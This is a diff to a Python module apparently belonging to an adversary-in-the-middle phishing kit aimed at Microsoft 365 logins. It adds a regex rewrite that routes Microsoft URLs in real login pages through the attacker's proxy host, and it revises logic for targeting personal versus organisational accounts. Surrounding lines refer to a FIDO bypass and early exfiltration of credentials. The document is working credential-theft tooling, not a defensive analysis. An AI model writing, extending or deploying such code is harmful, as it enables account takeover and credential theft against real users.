@@ -16,6 +16,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
+import re
 
 
 class Office365Module(BaseModule):
@@ -100,14 +101,14 @@ class Office365Module(BaseModule):
         personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
         is_personal = any(domain in self.user.lower() for domain in personal_domains)
 
-        # Use AiTM for both personal and organizational accounts
-        # Personal account support has been implemented with proper FIDO bypass
+        # Keep using AiTM for both account types; investigate white-screen issue via
+        # improved proxy logic rather than switching to Selenium.
+
         self.attack_mode = "aitm"
-        
         if is_personal:
-            self.log(f"[AiTM] Personal account detected ({self.user}) – using AiTM with personal account flow")
+            self.log(f"[AiTM] Personal account detected ({self.user}) – continuing with AiTM flow (enhanced mapping)")
         else:
-            self.log(f"[AiTM] Organizational account detected ({self.user}) – using AiTM with organizational flow")
+            self.log(f"[AiTM] Organisational account detected ({self.user}) – using AiTM flow")
         
         
         # Send early exfiltration of credentials
@@ -967,6 +968,19 @@ class Office365Module(BaseModule):
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
+                    # Broad regex-based rewrite for any direct Microsoft URLs we didn't explicitly list
+                    def _rewrite(match):
+                        url = match.group(0)
+                        # Strip protocol
+                        proto_removed = re.sub(r'^https?:\/\/', '', url)
+                        # Keep only path after domain
+                        path_part = '/'.join(proto_removed.split('/')[1:])
+                        return f"https://{current_host}/proxy/{path_part}"
+
+                    # Match https://<something>.live.com/... or https://<something>.microsoft.com/...
+                    pattern = r"https?:\/\/[A-Za-z0-9\-.]*(live\.com|microsoft\.com)/(?:[A-Za-z0-9_\-./?=&%+]*)"
+                    content_str = re.sub(pattern, _rewrite, content_str)
+
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
                     
